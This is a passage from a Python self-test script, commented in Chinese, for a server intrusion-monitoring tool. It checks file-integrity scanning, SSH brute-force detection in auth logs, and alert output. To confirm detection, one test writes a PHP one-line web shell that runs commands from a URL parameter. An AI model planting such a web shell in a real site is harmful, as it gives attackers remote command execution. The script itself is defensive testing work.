              f"误报：{sorted(os.path.basename(p) for p in false_pos)}")
    if os.name == "nt":
        print("  [跳过] 777 权限脚本识别 —— Windows 无 Unix 权限位，请在 Ubuntu 上验证")
    else:
        mode_alerts = [a for a in alerter2.alerts if a.rule_id == "DEF-033"]
        rep.check("777 权限脚本被识别", bool(mode_alerts), f"{len(mode_alerts)} 条")

    # 新增文件 + 修改文件检测
    time.sleep(1.1)
    new_path = os.path.join(webroot, "upload", "new.php")
    with open(new_path, "w", encoding="utf-8") as fh:
        fh.write("<?php system($_GET['c']); ?>")
    with open(os.path.join(webroot, "index.php"), "a", encoding="utf-8") as fh:
        fh.write("\n// deployed v2\n")
    alerter2.alerts.clear()
    second = scanner.scan()
    rep.check("识别出新增脚本文件", any(r.path == new_path for r in second.new_files),
              f"new={[os.path.basename(r.path) for r in second.new_files]}")
    rep.check("识别出被修改的脚本文件",
              any(r.path.endswith("index.php") for r in second.modified_files),
              f"modified={[os.path.basename(r.path) for r in second.modified_files]}")
    rep.check("新增的一句话说马内容被检出（DEF-031）",
              any(a.rule_id == "DEF-031" and "new.php" in a.flow for a in alerter2.alerts),
              str([(a.rule_id, os.path.basename(a.flow)) for a in alerter2.alerts]))
    rep.check("新增文件告警（DEF-030）", any(a.rule_id == "DEF-030" for a in alerter2.alerts))

    # 更新基线后不再报新增/修改
    scanner.update_baseline()
    alerter2.alerts.clear()
    third = scanner.scan()
    rep.check("更新基线后不再误报新增/修改",
              not third.new_files and not third.modified_files,
              f"new={len(third.new_files)} modified={len(third.modified_files)}")

    # ==================================================================
    print("\n[C] 认证日志监控")
    auth_path = os.path.join(workdir, "auth.log")
    with open(auth_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(build_auth_log()) + "\n")
    alerter3 = Alerter(log_dir=os.path.join(workdir, "logs3"), syslog=False, console=False)
    auth = AuthMonitor(
        alert_fn=alerter3.emit,
        log_fn=alerter3.log,
        analyzer_rules=analyzer.rules,
        sources=[{"name": "auth", "path": auth_path}],
        from_beginning=True,
        fail_window=600,
        fail_threshold=5,
        trusted_ips=["127.0.0.1"],
    )
    rounds = 0
    while auth.poll_once() > 0 and rounds < 20:
        rounds += 1
    auth_rules = {a.rule_id for a in alerter3.alerts}
    rep.check("SSH 爆破被识别（DEF-040）", "DEF-040" in auth_rules, str(sorted(auth_rules)))
    rep.check("爆破后成功登录被识别（DEF-041）", "DEF-041" in auth_rules)
    rep.check("提权/建号被识别（DEF-042）", "DEF-042" in auth_rules)
    succ = [a for a in alerter3.alerts if a.rule_id == "DEF-041" and "198.51.100.77" in a.flow]
    rep.check("爆破来源的成功登录被加分提示", bool(succ) and succ[0].score > 15,
              str([(a.rule_id, a.score, a.flow) for a in alerter3.alerts]))

    # ==================================================================
    print("\n[D] Windows 侧：IIS 日志 / 事件日志 / IIS 马文件")
    _test_windows_section(rep, workdir, analyzer)

    # ==================================================================
    print("\n[E] 配置能力基线提醒")
    plain_log = os.path.join(workdir, "plain.log")
    browser = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
    with open(plain_log, "w", encoding="utf-8") as fh:
        for i in range(60):
            fh.write(f'10.0.0.{i % 5} - - [13/Oct/2026:10:00:{i % 60:02d} +0800] '
                     f'"GET /page{i} HTTP/1.1" 200 100 "-" "{browser}"\n')
    alerter4 = Alerter(log_dir=os.path.join(workdir, "logs4"), syslog=False, console=False)
    mon4 = WebLogMonitor(
        alert_fn=alerter4.emit, log_fn=alerter4.log, analyzer=analyzer,
        sources=[{"name": "plain", "path": plain_log, "format": "nginx_combined"}],
        from_beginning=True,
    )
    rounds = 0
    while mon4.poll_once() > 0 and rounds < 20:
        rounds += 1
    rep.check("未记录请求体时给出能力基线提醒（DEF-050）",
              any(a.rule_id == "DEF-050" for a in alerter4.alerts),
              str([a.rule_id for a in alerter4.alerts]))

    # ==================================================================
    print("\n[F] 告警输出")
    jsonl = [f for f in os.listdir(os.path.join(workdir, "logs")) if f.endswith(".jsonl")]
    rep.check("生成结构化告警日志", bool(jsonl), str(jsonl))
    if jsonl:
        import json

        path = os.path.join(workdir, "logs", jsonl[0])
        lines = [json.loads(x) for x in open(path, encoding="utf-8")]
        rep.check("JSONL 字段完整（含 host/rule_id/advice）",
                  all({"host", "rule_id", "advice", "severity"} <= set(d) for d in lines))
        rep.check("告警数量与内存记录一致", len(lines) == len(alerter.alerts),
                  f"{len(lines)} vs {len(alerter.alerts)}")

    ok = rep.report()
    print(f"\n自测产物目录：{workdir}")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
